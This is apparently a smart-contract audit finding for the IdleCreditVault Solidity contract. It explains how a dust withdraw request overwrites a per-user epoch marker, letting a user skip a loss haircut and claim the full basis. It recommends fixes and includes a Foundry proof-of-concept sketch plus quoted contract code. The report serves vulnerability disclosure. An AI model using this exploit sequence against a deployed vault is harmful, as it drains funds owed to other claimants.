### Title
Re-requesting a withdraw after a loss-adjusted `stopEpochWithDuration` lets the user dodge the haircut and claim the full basis - ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary
When `stopEpochWithDuration` realizes a loss, `collectWithdrawFunds` funds pending withdraw receipts at a haircut and stores `lossRecoveryPriceByEpoch[epochNumber]`. The only path that applies the haircut, `_claimLossAdjustedWithdrawRequest`, looks up the loss epoch exclusively via `lastWithdrawRequest[_user]` — a single slot that is overwritten on every new `requestWithdraw`. A user with a haircutted receipt who makes a new (even dust-sized) withdraw request in a later epoch moves the marker past the loss epoch, so the haircutted basis stays inside `withdrawsRequests[_user]` and is later paid out at par by `_claimFundedWithdrawRequest`, while the strategy only received the haircutted funding.

### Finding Description
- `collectWithdrawFunds` records `lossRecoveryPriceByEpoch[epochNumber]` and sets `pendingWithdraws = 0` when the borrower under-funds pending receipts [1](#0-0) 
- `requestWithdraw` records the request in `withdrawsRequestsByEpoch[user][currentEpoch]` and overwrites `lastWithdrawRequest[user] = currentEpoch` [2](#0-1) 
- `claimWithdrawRequest` calls `_claimLossAdjustedWithdrawRequest`, which checks `lossRecoveryPriceByEpoch[lastWithdrawRequest[user]]` only [3](#0-2) 
- If a newer request overwrote `lastWithdrawRequest`, `lossRecoveryPriceByEpoch` for the new epoch is 0, the loss path returns 0, and the old epoch's basis remains in `withdrawsRequestsByEpoch[user][lossEpoch]` and in the aggregate `withdrawsRequests[user]` — `_clearWithdrawClaimForEpoch` is never reached for that epoch.
- `_claimFundedWithdrawRequest` then pays `withdrawsRequests[user]` (which still includes the haircutted basis) at par once `epochNumber > lastWithdrawRequest[user]` [4](#0-3) 

### Impact Explanation
The vault only pulled `pendingBasis - pendingLoss` underlying from the CDO for the loss epoch [5](#0-4) . Paying the haircutted receipts at par spends underlyings that were never funded: the attacker steals the share of the loss that should have been socialized across the epoch's redeemers, directly draining funds reserved for other claimants (insolvency for later claims, or theft of recovery/funded reserves). Loss is quantified as `claimBasis * (1 - lossRecoveryPrice/RECOVERY_FULL)` per re-requesting user, i.e. the entire haircut.

### Likelihood Explanation
Requires only an unprivileged tranche holder: request a withdraw in an epoch that ends with `stopEpochWithDuration(_lossAmount > 0)`, then submit a minimal second `requestWithdraw` in the next epoch (multiple pending requests are explicitly supported, per the NOTE in `_claimFundedWithdrawRequest` and test `testClaimWithdrawRequest`), wait one epoch, and claim. No privileged action is needed; KYC gating does not prevent it. The only precondition is a realized-loss stop, which is a normal protocol flow.

### Recommendation
Track loss epochs independently of the mutable `lastWithdrawRequest` marker: e.g. record `lossEpochByUser` (or a per-epoch bitmap / list of epochs with pending basis) when the loss is crystallized, and have `claimWithdrawRequest` iterate all epochs with `lossRecoveryPriceByEpoch != 0` for which the user has basis — or prevent `requestWithdraw` while the user holds an unclaimed receipt in a loss-adjusted epoch. At minimum, apply the haircut inside `_claimFundedWithdrawRequest` for any epoch with a stored `lossRecoveryPriceByEpoch`.

### Proof of Concept
Foundry fork sketch (mirroring `test/foundry/IdleCreditVault.t.sol` helpers):

```solidity
// 1. deposit, start epoch 0, stop healthy (epochNumber -> 1)
idleCDO.depositAA(amountWei);
_startEpochAndCheckPrices(0);
_stopEpochAndCheckPrices(0, initialProvidedApr, _expectedFundsEndEpoch());

// 2. request full withdraw in epoch 1
uint256 req = cdoEpoch.requestWithdraw(0, address(AAtranche));
_startEpochAndCheckPrices(1);

// 3. stop epoch 1 with a realized loss via stopEpochWithDuration
//    (borrower under-funds pending receipts -> lossRecoveryPriceByEpoch[1] = p < 1)
uint256 loss = req / 2;
vm.prank(manager);
cdoEpoch.stopEpochWithDuration(loss, epochDuration); // triggers collectWithdrawFunds haircut

// 4. instead of claiming (which would pay req * p), re-request a dust withdraw
//    in the new epoch -> lastWithdrawRequest[user] is overwritten to epoch 2
cdoEpoch.requestWithdraw(1, address(BBtranche)); // dust amount

// 5. run one more healthy epoch so epochNumber > lastWithdrawRequest
_startEpochAndCheckPrices(2);
_stopEpochAndCheckPrices(2, initialProvidedApr, _expectedFundsEndEpoch());

// 6. claim: _claimLossAdjustedWithdrawRequest sees lossRecoveryPriceByEpoch[2] == 0,
//    _claimFundedWithdrawRequest pays withdrawsRequests[user] (req + dust) at par
uint256 balPre = underlying.balanceOf(user);
cdoEpoch.claimWithdrawRequest();
// attacker receives `req` in full instead of `req * p`; the vault paid the
// un-funded haircut out of other claimants' reserves -> insolvency.
assertGt(underlying.balanceOf(user) - balPre, req * lossRecoveryPrice / 1e18);
```

Note: if `stopEpochWithDuration` requires the loss to fit within basis or reverts on `previewLossAdjustedWithdrawFunds`, keep `loss` below the funded basis so a nonzero `lossRecoveryPrice` is stored.

```text
  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

```text
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
```

```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
```
